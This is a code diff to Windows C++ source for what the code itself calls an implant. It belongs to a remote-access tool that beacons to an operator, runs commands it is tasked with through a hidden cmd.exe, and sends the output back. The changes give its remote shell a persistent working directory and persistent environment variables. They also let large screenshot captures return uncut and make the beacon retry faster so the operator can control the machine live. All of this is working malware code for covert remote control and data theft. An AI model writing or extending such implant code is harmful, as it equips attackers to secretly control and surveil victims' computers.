+    if (!GetEnvironmentVariableW(L"USERPROFILE", tmp, MAX_PATH) ||
+        !IsDirectoryPath(tmp))
+        GetCurrentDirectoryW(MAX_PATH, tmp);
+    g_ShellCwd = tmp;
+}
+
+static std::wstring LowerTrim(const std::wstring& s) {
+    size_t a = s.find_first_not_of(L" \t");
+    if (a == std::wstring::npos) return L"";
+    size_t b = s.find_last_not_of(L" \t\r\n");
+    std::wstring r = s.substr(a, b - a + 1);
+    std::transform(r.begin(), r.end(), r.begin(), ::towlower);
+    return r;
+}
+
+// Last non-empty line of cmd output — for `cd X & cd` that's the new cwd.
+static std::wstring LastNonEmptyLine(const std::wstring& out) {
+    size_t end = out.find_last_not_of(L" \t\r\n");
+    if (end == std::wstring::npos) return L"";
+    size_t start = out.rfind(L'\n', end);
+    start = (start == std::wstring::npos) ? 0 : start + 1;
+    std::wstring line = out.substr(start, end - start + 1);
+    // strip possible leading "> " prompt echo
+    if (line.rfind(L"> ", 0) == 0) line = line.substr(2);
+    return line;
+}
+
 std::wstring ExecuteCommand(const std::wstring& cmd) {
     std::string cmdStr = WStringToUTF8(cmd);
     for (const auto& entry : kCmdTable) {
@@ -985,10 +1550,26 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
                 return entry.handler(cmdStr.substr(strlen(entry.prefix)));
         }
     }
-    // Fallback: raw command via cmd.exe /C
+
+    InitShellCwd();
+    std::wstring lcmd = LowerTrim(cmd);
+
+    // Bare `cd` — just report where we are
+    if (lcmd == L"cd")
+        return L"[cwd] " + g_ShellCwd;
+
+    // Shell-state commands: cd variants and bare drive changes print their
+    // resulting directory (trailing `& cd`) so we can carry it forward.
+    bool isCd    = lcmd.rfind(L"cd ", 0) == 0 || lcmd.rfind(L"cd/", 0) == 0 ||
+                   lcmd.rfind(L"cd.", 0) == 0;
+    bool isDrive = lcmd.size() == 2 && lcmd[1] == L':' && iswalpha(lcmd[0]);
+    bool isSet   = lcmd.rfind(L"set ", 0) == 0 &&
+                   cmd.find(L'=', 4) != std::wstring::npos;
+
     wchar_t sysRoot[MAX_PATH] = {};
     GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
-    std::wstring cmdLine = std::wstring(sysRoot) + L"\\System32\\cmd.exe /C " + cmd;
+    std::wstring full = (isCd || isDrive) ? (cmd + L" & cd") : cmd;
+    std::wstring cmdLine = std::wstring(sysRoot) + L"\\System32\\cmd.exe /C " + full;
 
     SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
     HANDLE hRead = nullptr, hWrite = nullptr;
@@ -1004,10 +1585,20 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
     si.hStdInput  = nullptr;
 
     PROCESS_INFORMATION pi = {};
-    if (!CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
-                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
-        CloseHandle(hRead); CloseHandle(hWrite);
-        return L"[error: CreateProcess failed]";
+    BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
+                             CREATE_NO_WINDOW, nullptr, g_ShellCwd.c_str(), &si, &pi);
+    if (!ok) {
+        // The stored cwd may have been deleted — reset and retry without it.
+        g_ShellCwd.clear();
+        InitShellCwd();
+        ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
+                            CREATE_NO_WINDOW, nullptr, g_ShellCwd.c_str(), &si, &pi);
+        if (!ok) ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
+                                     CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
+        if (!ok) {
+            CloseHandle(hRead); CloseHandle(hWrite);
+            return L"[error: CreateProcess failed]";
+        }
     }
     CloseHandle(hWrite);
 
@@ -1022,7 +1613,33 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
         TerminateProcess(pi.hProcess, 1);
     }
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hRead);
-    return UTF8ToWString(output);
+
+    std::wstring wout = UTF8ToWString(output);
+
+    if (isCd || isDrive) {
+        std::wstring candidate = LastNonEmptyLine(wout);
+        if (!candidate.empty() && IsDirectoryPath(candidate))
+            g_ShellCwd = candidate;
+    }
+    if (isSet) {
+        // Mirror `set VAR=VALUE` into the implant environment — child cmd.exe
+        // inherits it, so variables persist across tasks like in a real shell.
+        std::wstring body = cmd.substr(cmd.find_first_not_of(L" \t") + 4);
+        size_t eq = body.find(L'=');
+        if (eq != std::wstring::npos) {
+            std::wstring var = body.substr(0, eq);
+            std::wstring val = body.substr(eq + 1);
+            size_t v1 = var.find_first_not_of(L" \t");
+            size_t v2 = var.find_last_not_of(L" \t");
+            if (v1 != std::wstring::npos) {
+                var = var.substr(v1, v2 - v1 + 1);
+                SetEnvironmentVariableW(var.c_str(),
+                                        val.empty() ? nullptr : val.c_str());
+            }
+        }
+    }
+
+    return wout + L"\n[cwd] " + g_ShellCwd;
 }
 
 // =====================================================================
@@ -1086,11 +1703,14 @@ DWORD BeaconLoop(const Session& session) {
                 wasDown = true;
                 DebugLog(L"Beacon fail #" + std::to_wstring(failures));
 
-                // Exponential backoff capped at 30 min
+                // Exponential backoff capped at 30 min — but in rapid-poll
+                // mode (shell / live view) retry within seconds so one
+                // ngrok hiccup doesn't freeze the operator's console.
                 DWORD backoffSec = config::BEACON_MIN * (1u << std::min<DWORD>(failures - 1u, 6u));
                 if (backoffSec > 1800) backoffSec = 1800;
+                if (g_BeaconOverride > 0 && backoffSec > 3) backoffSec = 3;
                 DebugLog(L"Backoff " + std::to_wstring(backoffSec) + L"s");
-                JitterSleep(backoffSec, backoffSec + 30);
+                JitterSleep(backoffSec, g_BeaconOverride > 0 ? backoffSec + 1 : backoffSec + 30);
                 continue;
             }
 
@@ -1127,8 +1747,16 @@ DWORD BeaconLoop(const Session& session) {
                 }
                 DebugLog(L"Exec: " + task);
                 std::wstring result = ExecuteCommand(task);
-                if (result.size() > config::CMD_OUTPUT_MAX / sizeof(wchar_t))
-                    result.resize(config::CMD_OUTPUT_MAX / sizeof(wchar_t));
+                // Screenshots are multi-MB base64 BMPs — never truncate them,
+                // or the image data arrives corrupted. Text output keeps the
+                // 64 KB cap.
+                const bool isScreenshot =
+                    result.rfind(L"[SCREENSHOT:BMP]\n", 0) == 0;
+                const size_t cap = isScreenshot
+                    ? 32u * 1024u * 1024u
+                    : static_cast<size_t>(config::CMD_OUTPUT_MAX) / sizeof(wchar_t);
+                if (result.size() > cap)
+                    result.resize(cap);
                 SendResult(session.sessionId, result);
                 // Re-beacon immediately after a task — no sleep, pick up next command fast
                 continue;
